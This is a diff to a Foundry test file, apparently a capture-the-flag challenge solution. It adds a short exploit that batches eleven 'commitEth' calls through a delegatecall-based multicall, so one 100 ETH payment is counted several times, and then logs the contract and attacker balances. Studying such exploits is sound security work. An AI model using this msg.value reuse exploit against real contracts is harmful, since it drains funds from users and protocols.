@@ -65,6 +65,15 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
 
         // implement solution here
+        bytes[] memory datas = new bytes[](11);
+        for(uint256 i; i < datas.length; ++i) {
+            datas[i] = abi.encodeWithSignature("commitEth(address)", attacker);
+        }
+        //delegatecall causes multi-spend of msg.value
+        dutchAuction.multicall{value:100e18}(datas);
+
+        emit log_named_decimal_uint("eth=", address(dutchAuction).balance, 18);
+        emit log_named_decimal_uint("eth=", address(attacker).balance, 18);
 
         vm.stopPrank();
         validation();
